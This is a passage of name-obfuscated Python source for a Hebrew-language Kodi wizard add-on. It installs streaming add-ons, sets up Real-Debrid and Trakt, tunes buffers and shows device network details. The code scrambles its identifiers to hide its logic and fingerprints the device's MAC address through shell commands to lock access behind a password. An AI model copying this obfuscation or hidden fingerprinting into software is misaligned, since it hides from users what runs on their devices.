							OOOOO00OOO0O0O0O0 =OOOOO00OOO0O0O0O0 [1 :OOOOO00OOO0O0O0O0 .rfind (O00O00O0OO0OO00O0 )]#line:1713
					else :#line:1714
						if OOOOO00OOO0O0O0O0 .find (" ")>0 :#line:1715
							OOOOO00OOO0O0O0O0 =OOOOO00OOO0O0O0O0 [:OOOOO00OOO0O0O0O0 .find (" ")]#line:1716
						elif OOOOO00OOO0O0O0O0 .find ("/")>0 :#line:1717
							OOOOO00OOO0O0O0O0 =OOOOO00OOO0O0O0O0 [:OOOOO00OOO0O0O0O0 .find ("/")]#line:1718
						elif OOOOO00OOO0O0O0O0 .find (">")>0 :#line:1719
							OOOOO00OOO0O0O0O0 =OOOOO00OOO0O0O0O0 [:OOOOO00OOO0O0O0O0 .find (">")]#line:1720
					O0OO00000OO0O00O0 .append (OOOOO00OOO0O0O0O0 .strip ())#line:1722
			O0O0OO0O0OOOOOO00 =O0OO00000OO0O00O0 #line:1723
		else :#line:1724
			O0OO00000OO0O00O0 =[]#line:1725
			for O0OO0OOOOO0OO0000 in O0O0OO0O0OOOOOO00 :#line:1726
				OO0000O0O0O00OOO0 =u"</"+name #line:1727
				O0000000O0OO0OO00 =O0OO00OO000OO0OOO .find (O0OO0OOOOO0OO0000 )#line:1729
				O00O00O0O00O00O0O =O0OO00OO000OO0OOO .find (OO0000O0O0O00OOO0 ,O0000000O0OO0OO00 )#line:1730
				O000OO0OOOOOO0000 =O0OO00OO000OO0OOO .find ("<"+name ,O0000000O0OO0OO00 +1 )#line:1731
				while O000OO0OOOOOO0000 <O00O00O0O00O00O0O and O000OO0OOOOOO0000 !=-1 :#line:1733
					O0OO00O0O000OO0O0 =O0OO00OO000OO0OOO .find (OO0000O0O0O00OOO0 ,O00O00O0O00O00O0O +len (OO0000O0O0O00OOO0 ))#line:1734
					if O0OO00O0O000OO0O0 !=-1 :#line:1735
						O00O00O0O00O00O0O =O0OO00O0O000OO0O0 #line:1736
					O000OO0OOOOOO0000 =O0OO00OO000OO0OOO .find ("<"+name ,O000OO0OOOOOO0000 +1 )#line:1737
				if O0000000O0OO0OO00 ==-1 and O00O00O0O00O00O0O ==-1 :#line:1739
					O000000OO0OO0O000 =u""#line:1740
				elif O0000000O0OO0OO00 >-1 and O00O00O0O00O00O0O >-1 :#line:1741
					O000000OO0OO0O000 =O0OO00OO000OO0OOO [O0000000O0OO0OO00 +len (O0OO0OOOOO0OO0000 ):O00O00O0O00O00O0O ]#line:1742
				elif O00O00O0O00O00O0O >-1 :#line:1743
					O000000OO0OO0O000 =O0OO00OO000OO0OOO [:O00O00O0O00O00O0O ]#line:1744
				elif O0000000O0OO0OO00 >-1 :#line:1745
					O000000OO0OO0O000 =O0OO00OO000OO0OOO [O0000000O0OO0OO00 +len (O0OO0OOOOO0OO0000 ):]#line:1746
				if ret :#line:1748
					OO0000O0O0O00OOO0 =O0OO00OO000OO0OOO [O00O00O0O00O00O0O :O0OO00OO000OO0OOO .find (">",O0OO00OO000OO0OOO .find (OO0000O0O0O00OOO0 ))+1 ]#line:1749
					O000000OO0OO0O000 =O0OO0OOOOO0OO0000 +O000000OO0OO0O000 +OO0000O0O0O00OOO0 #line:1750
				O0OO00OO000OO0OOO =O0OO00OO000OO0OOO [O0OO00OO000OO0OOO .find (O000000OO0OO0O000 ,O0OO00OO000OO0OOO .find (O0OO0OOOOO0OO0000 ))+len (O000000OO0OO0O000 ):]#line:1752
				O0OO00000OO0O00O0 .append (O000000OO0OO0O000 )#line:1753
			O0O0OO0O0OOOOOO00 =O0OO00000OO0O00O0 #line:1754
		O0OO0O0O0O0O0O00O +=O0O0OO0O0OOOOOO00 #line:1755
	return O0OO0O0O0O0O0O00O #line:1757
def addItem (O0OOOO0OO00000O0O ,O0OOO00O000000O0O ,OO0O00OOO0OOO0OOO ,OOOOO0O00OOO000OO ,OO0OOO0OOO0OO0000 ,description =None ):#line:1759
	if description ==None :description =''#line:1760
	description ='[COLOR white]'+description +'[/COLOR]'#line:1761
	OOOO000O00O00O0OO =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OOO00O000000O0O )+"&mode="+str (OO0O00OOO0OOO0OOO )+"&name="+urllib .quote_plus (O0OOOO0OO00000O0O )+"&iconimage="+urllib .quote_plus (OOOOO0O00OOO000OO )+"&fanart="+urllib .quote_plus (OO0OOO0OOO0OO0000 )#line:1762
	OOO0O00O0O0O00O00 =True #line:1763
	O0OOOOOO000O00000 =xbmcgui .ListItem (O0OOOO0OO00000O0O ,iconImage =OOOOO0O00OOO000OO ,thumbnailImage =OOOOO0O00OOO000OO )#line:1764
	O0OOOOOO000O00000 .setInfo (type ="Video",infoLabels ={"Title":O0OOOO0OO00000O0O ,"Plot":description })#line:1765
	O0OOOOOO000O00000 .setProperty ("fanart_Image",OO0OOO0OOO0OO0000 )#line:1766
	O0OOOOOO000O00000 .setProperty ("icon_Image",OOOOO0O00OOO000OO )#line:1767
	OOO0O00O0O0O00O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO000O00O00O0OO ,listitem =O0OOOOOO000O00000 ,isFolder =False )#line:1768
	return OOO0O00O0O0O00O00 #line:1769
def get_params ():#line:1771
		OO0OOOO000O0O0OO0 =[]#line:1772
		OOO00OOOOO00O00O0 =sys .argv [2 ]#line:1773
		if len (OOO00OOOOO00O00O0 )>=2 :#line:1774
				O000OOO0O000O0OOO =sys .argv [2 ]#line:1775
				O00O0O0000O000OO0 =O000OOO0O000O0OOO .replace ('?','')#line:1776
				if (O000OOO0O000O0OOO [len (O000OOO0O000O0OOO )-1 ]=='/'):#line:1777
						O000OOO0O000O0OOO =O000OOO0O000O0OOO [0 :len (O000OOO0O000O0OOO )-2 ]#line:1778
				OOO00OOO0OOOOOO00 =O00O0O0000O000OO0 .split ('&')#line:1779
				OO0OOOO000O0O0OO0 ={}#line:1780
				for OO000OOOO0OO0OOOO in range (len (OOO00OOO0OOOOOO00 )):#line:1781
						OOOOOOOOO0OOO00O0 ={}#line:1782
						OOOOOOOOO0OOO00O0 =OOO00OOO0OOOOOO00 [OO000OOOO0OO0OOOO ].split ('=')#line:1783
						if (len (OOOOOOOOO0OOO00O0 ))==2 :#line:1784
								OO0OOOO000O0O0OO0 [OOOOOOOOO0OOO00O0 [0 ]]=OOOOOOOOO0OOO00O0 [1 ]#line:1785
		return OO0OOOO000O0O0OO0 #line:1787
def decode (OOO00O00OOOOOO00O ,O0O000OO0O0OOO0O0 ):#line:1792
    import base64 #line:1793
    O0OO00000O0O0OO0O =[]#line:1794
    if (len (OOO00O00OOOOOO00O ))!=4 :#line:1796
     return 10 #line:1797
    O0O000OO0O0OOO0O0 =base64 .urlsafe_b64decode (O0O000OO0O0OOO0O0 )#line:1798
    for OO00O0O00O00O0OOO in range (len (O0O000OO0O0OOO0O0 )):#line:1800
        O0000OOOO0O0O00OO =OOO00O00OOOOOO00O [OO00O0O00O00O0OOO %len (OOO00O00OOOOOO00O )]#line:1801
        O0O0OO0O0OO000000 =chr ((256 +ord (O0O000OO0O0OOO0O0 [OO00O0O00O00O0OOO ])-ord (O0000OOOO0O0O00OO ))%256 )#line:1802
        O0OO00000O0O0OO0O .append (O0O0OO0O0OO000000 )#line:1803
    return "".join (O0OO00000O0O0OO0O )#line:1804
def tmdb_list (O0OOO00O0O000O00O ):#line:1805
    O0OOO000O0000O0O0 =decode ("7643",O0OOO00O0O000O00O )#line:1808
    return int (O0OOO000O0000O0O0 )#line:1811
def u_list (OO0OO0O0O0OO00O0O ):#line:1812
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1814
        from math import sqrt #line:1815
        O0O0O0000OO00O0OO =tmdb_list (TMDB_NEW_API )#line:1816
        OOO00OOOOOO0O0OO0 =str ((getHwAddr ('eth0'))*O0O0O0000OO00O0OO )#line:1818
        OO0OO0OOOO0OO0OOO =int (OOO00OOOOOO0O0OO0 [1 ]+OOO00OOOOOO0O0OO0 [2 ]+OOO00OOOOOO0O0OO0 [5 ]+OOO00OOOOOO0O0OO0 [7 ])#line:1819
        OOO0O0O0O0O0O0O00 =(ADDON .getSetting ("pass"))#line:1821
        OO00OO0OO000O0O00 =(str (round (sqrt ((OO0OO0OOOO0OO0OOO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1826
        if '.'in OO00OO0OO000O0O00 :#line:1828
         OO00OO0OO000O0O00 =(str (round (sqrt ((OO0OO0OOOO0OO0OOO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1829
        if OOO0O0O0O0O0O0O00 ==OO00OO0OO000O0O00 :#line:1831
          OOOOOOO0O00OOO00O =OO0OO0O0O0OO00O0O #line:1833
        else :#line:1835
           if STARTP2 ()and STARTP ()=='ok':#line:1836
             return OO0OO0O0O0OO00O0O #line:1839
           OOOOOOO0O00OOO00O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1840
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1841
           sys .exit ()#line:1842
        return OOOOOOO0O00OOO00O #line:1843
    else :#line:1844
        STARTP ()#line:1845
def disply_hwr ():#line:1849
   try :#line:1850
    O0OOO0OO00O0O0OOO =tmdb_list (TMDB_NEW_API )#line:1851
    OO00OO0O00OOOO0OO =str ((getHwAddr ('eth0'))*O0OOO0OO00O0O0OOO )#line:1852
    O0O0OOOOOO0O0O000 =(OO00OO0O00OOOO0OO [1 ]+OO00OO0O00OOOO0OO [2 ]+OO00OO0O00OOOO0OO [5 ]+OO00OO0O00OOOO0OO [7 ])#line:1859
    O0O0OO0OO0O0OOOO0 =(ADDON .getSetting ("action"))#line:1860
    wiz .setS ('action',str (O0O0OOOOOO0O0O000 ))#line:1862
   except :pass #line:1863
def disply_hwr2 ():#line:1864
   try :#line:1865
    O000OO0O0OO0OOOO0 =tmdb_list (TMDB_NEW_API )#line:1866
    OO0O00000OOOOOOOO =str ((getHwAddr ('eth0'))*O000OO0O0OO0OOOO0 )#line:1868
    O0O00OO0OO0OO0O00 =(OO0O00000OOOOOOOO [1 ]+OO0O00000OOOOOOOO [2 ]+OO0O00000OOOOOOOO [5 ]+OO0O00000OOOOOOOO [7 ])#line:1877
    O00O0O0O000OO0OOO =(ADDON .getSetting ("action"))#line:1878
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O00OO0OO0OO0O00 )#line:1881
   except :pass #line:1882
def getHwAddr (O0O0O00OOOOOO0O0O ):#line:1884
   import subprocess ,time #line:1885
   O0O0O0OOOO000OO0O ='windows'#line:1886
   if xbmc .getCondVisibility ('system.platform.android'):#line:1887
       O0O0O0OOOO000OO0O ='android'#line:1888
   if xbmc .getCondVisibility ('system.platform.android'):#line:1889
     OO000O0O0OO00O000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1890
     O0OO00OO00O00OO0O =re .compile ('link/ether (.+?) brd').findall (str (OO000O0O0OO00O000 ))#line:1892
     O0O000OOO000O00OO =0 #line:1893
     for OOO00O00OO0OOO000 in O0OO00OO00O00OO0O :#line:1894
      if O0OO00OO00O00OO0O !='00:00:00:00:00:00':#line:1895
          O000O0O00O0000000 =OOO00O00OO0OOO000 #line:1896
          O0O000OOO000O00OO =O0O000OOO000O00OO +int (O000O0O00O0000000 .replace (':',''),16 )#line:1897
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1899
       OO0OO0O00OOOOO000 =0 #line:1900
       O0O000OOO000O00OO =0 #line:1901
       OOO0OOO00O0O000O0 =[]#line:1902
       OO0O0O0OO0OOOOO0O =os .popen ("getmac").read ()#line:1903
       OO0O0O0OO0OOOOO0O =OO0O0O0OO0OOOOO0O .split ("\n")#line:1904
       for OOO00O000O000O00O in OO0O0O0OO0OOOOO0O :#line:1906
            OO00O0O0OOOOO000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO00O000O000O00O ,re .I )#line:1907
            if OO00O0O0OOOOO000O :#line:1908
                O0OO00OO00O00OO0O =OO00O0O0OOOOO000O .group ().replace ('-',':')#line:1909
                OOO0OOO00O0O000O0 .append (O0OO00OO00O00OO0O )#line:1910
                O0O000OOO000O00OO =O0O000OOO000O00OO +int (O0OO00OO00O00OO0O .replace (':',''),16 )#line:1913
   else :#line:1915
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1916
   try :#line:1933
    return O0O000OOO000O00OO #line:1934
   except :pass #line:1935
def getpass ():#line:1936
	disply_hwr2 ()#line:1938
def setpass ():#line:1939
    OO00OO00OO0OOO0O0 =xbmcgui .Dialog ()#line:1940
    O0OOOOOO0OO0OO0OO =''#line:1941
    O0O0O00OOO0OOO00O =xbmc .Keyboard (O0OOOOOO0OO0OO0OO ,'הכנס סיסמה')#line:1943
    O0O0O00OOO0OOO00O .doModal ()#line:1944
    if O0O0O00OOO0OOO00O .isConfirmed ():#line:1945
           O0O0O00OOO0OOO00O =O0O0O00OOO0OOO00O .getText ()#line:1946
    wiz .setS ('pass',str (O0O0O00OOO0OOO00O ))#line:1947
def setuname ():#line:1948
    O0O0O000O0OO0OO0O =''#line:1949
    O000O0000O0OO0O00 =xbmc .Keyboard (O0O0O000O0OO0OO0O ,'הכנס שם משתמש')#line:1950
    O000O0000O0OO0O00 .doModal ()#line:1951
    if O000O0000O0OO0O00 .isConfirmed ():#line:1952
           O0O0O000O0OO0OO0O =O000O0000O0OO0O00 .getText ()#line:1953
           wiz .setS ('user',str (O0O0O000O0OO0OO0O ))#line:1954
def powerkodi ():#line:1955
    os ._exit (1 )#line:1956
def buffer1 ():#line:1958
	OOOO0OOOO0OO0O0O0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1959
	O00O0O0OO00000000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1960
	OO00OOO00O00O000O =xbmc .getInfoLabel ("System.FreeMemory")#line:1961
	OO0OO0OO00O0O000O =re .sub ('[^0-9]','',OO00OOO00O00O000O )#line:1962
	OO0OO0OO00O0O000O =int (OO0OO0OO00O0O000O )/3 #line:1963
	O0OO0OO000OOO00O0 =OO0OO0OO00O0O000O *1024 *1024 #line:1964
	try :OO00O0O0OOO0OO0OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1965
	except :OO00O0O0OOO0OO0OO =16 #line:1966
	OOO00OO0000000O0O =DIALOG .yesno ('FREE MEMORY: '+str (OO00OOO00O00O000O ),'Based on your free Memory your optimal buffersize is: '+str (OO0OO0OO00O0O000O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1969
	if OOO00OO0000000O0O ==1 :#line:1970
		with open (OOOO0OOOO0OO0O0O0 ,"w")as O00O0O0O000O0OO00 :#line:1971
			if OO00O0O0OOO0OO0OO >=17 :OOO0OO0O000O0O00O =xml_data_advSettings_New (str (O0OO0OO000OOO00O0 ))#line:1972
			else :OOO0OO0O000O0O00O =xml_data_advSettings_old (str (O0OO0OO000OOO00O0 ))#line:1973
			O00O0O0O000O0OO00 .write (OOO0OO0O000O0O00O )#line:1975
			DIALOG .ok ('Buffer Size Set to: '+str (O0OO0OO000OOO00O0 ),'Please restart Kodi for settings to apply.','')#line:1976
	elif OOO00OO0000000O0O ==0 :#line:1978
		O0OO0OO000OOO00O0 =_O000O0OOOO000O0OO (default =str (O0OO0OO000OOO00O0 ),heading ="INPUT BUFFER SIZE")#line:1979
		with open (OOOO0OOOO0OO0O0O0 ,"w")as O00O0O0O000O0OO00 :#line:1980
			if OO00O0O0OOO0OO0OO >=17 :OOO0OO0O000O0O00O =xml_data_advSettings_New (str (O0OO0OO000OOO00O0 ))#line:1981
			else :OOO0OO0O000O0O00O =xml_data_advSettings_old (str (O0OO0OO000OOO00O0 ))#line:1982
			O00O0O0O000O0OO00 .write (OOO0OO0O000O0O00O )#line:1983
			DIALOG .ok ('Buffer Size Set to: '+str (O0OO0OO000OOO00O0 ),'Please restart Kodi for settings to apply.','')#line:1984
def xml_data_advSettings_old (OO000000OOO00O000 ):#line:1985
	OO00000O000000000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO000000OOO00O000 #line:1995
	return OO00000O000000000 #line:1996
def xml_data_advSettings_New (OO0O0O0OOOOO0OOO0 ):#line:1998
	O0O0O00O0O000O0O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0O0O0OOOOO0OOO0 #line:2010
	return O0O0O00O0O000O0O0 #line:2011
def write_ADV_SETTINGS_XML (O00OO0OO0OO0O00OO ):#line:2012
    if not os .path .exists (xml_file ):#line:2013
        with open (xml_file ,"w")as OOOO00OOOOOOO0O0O :#line:2014
            OOOO00OOOOOOO0O0O .write (xml_data )#line:2015
def _O000O0OOOO000O0OO (default ="",heading ="",hidden =False ):#line:2016
    ""#line:2017
    O000OOO0O0O00OOO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2018
    O000OOO0O0O00OOO0 .doModal ()#line:2019
    if (O000OOO0O0O00OOO0 .isConfirmed ()):#line:2020
        return unicode (O000OOO0O0O00OOO0 .getText (),"utf-8")#line:2021
    return default #line:2022
def index ():#line:2024
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2025
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2026
	if AUTOUPDATE =='Yes':#line:2027
		if wiz .workingURL (WIZARDFILE )==True :#line:2028
			OOO00000O0OO000O0 =wiz .checkWizard ('version')#line:2029
			if OOO00000O0OO000O0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOO00000O0OO000O0 ),'wizardupdate',themeit =THEME2 )#line:2030
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
	if len (BUILDNAME )>0 :#line:2034
		OOOOO00O0O00000OO =wiz .checkBuild (BUILDNAME ,'version')#line:2035
		OO0O00OOO0OO0OO0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2036
		if OOOOO00O0O00000OO >BUILDVERSION :OO0O00OOO0OO0OO0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0O00OOO0OO0OO0O ,OOOOO00O0O00000OO )#line:2037
		addDir (OO0O00OOO0OO0OO0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2039
		try :#line:2041
		     O00O00OOOO0OO0OOO =wiz .themeCount (BUILDNAME )#line:2042
		except :#line:2043
		   O00O00OOOO0OO0OOO =False #line:2044
		if not O00O00OOOO0OO0OOO ==False :#line:2045
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2046
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2047
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2051
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2052
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2056
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2058
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2060
def morsetup ():#line:2062
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2063
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2064
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2065
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2067
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2071
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2072
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2076
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2078
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2088
	setView ('files','viewType')#line:2089
def morsetup2 ():#line:2090
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2091
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2101
def fastupdate ():#line:2102
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2103
def forcefastupdate ():#line:2105
			OOOO00000O00OOO0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2106
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO00000O00OOO0O )#line:2107
def rdsetup ():#line:2111
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2113
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2115
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2116
def traktsetup ():#line:2119
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2126
	setView ('files','viewType')#line:2127
def setautorealdebrid ():#line:2128
    from resources .libs import real_debrid #line:2129
    OO0000OO00O0OOOOO =real_debrid .RealDebridFirst ()#line:2130
    OO0000OO00O0OOOOO .auth ()#line:2131
def setrealdebrid ():#line:2133
    O00O0OOO00OOO0O0O =(ADDON .getSetting ("auto_rd"))#line:2134
    if O00O0OOO00OOO0O0O =='false':#line:2135
       ADDON .openSettings ()#line:2136
    else :#line:2137
        from resources .libs import real_debrid #line:2138
        OOO0O0O0000000OOO =real_debrid .RealDebrid ()#line:2139
        OOO0O0O0000000OOO .auth ()#line:2140
        rdon ()#line:2143
def resolveurlsetup ():#line:2145
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2146
def urlresolversetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2148
def placentasetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2151
def reptiliasetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2153
def flixnetsetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2155
def yodasetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2157
def numberssetup ():#line:2158
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2159
def uranussetup ():#line:2160
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2161
def genesissetup ():#line:2162
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2163
def net_tools (view =None ):#line:2165
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2166
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2167
	setView ('files','viewType')#line:2169
def speedMenu ():#line:2170
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2171
def viewIP ():#line:2172
	O0000000O0O0000O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2186
	O000O0O0O0OOOOO0O =[];O00OO00OOOO0O000O =0 #line:2187
	for O0OOOO0000O00O0O0 in O0000000O0O0000O0 :#line:2188
		OO000OO00OO0OO0OO =wiz .getInfo (O0OOOO0000O00O0O0 )#line:2189
		OO0O0000OO0O0OO00 =0 #line:2190
		while OO000OO00OO0OO0OO =="Busy"and OO0O0000OO0O0OO00 <10 :#line:2191
			OO000OO00OO0OO0OO =wiz .getInfo (O0OOOO0000O00O0O0 );OO0O0000OO0O0OO00 +=1 ;wiz .log ("%s sleep %s"%(O0OOOO0000O00O0O0 ,str (OO0O0000OO0O0OO00 )));xbmc .sleep (1000 )#line:2192
		O000O0O0O0OOOOO0O .append (OO000OO00OO0OO0OO )#line:2193
		O00OO00OOOO0O000O +=1 #line:2194
	O0OOO00OOOO0OOOOO ,O0OO0OOO0O0O0000O ,O00O0OOO0O0OOO000 =getIP ()#line:2195
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0O0OOOOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OOOO0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO0O0O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OOO0O0OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0O0OOOOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2200
	setView ('files','viewType')#line:2201
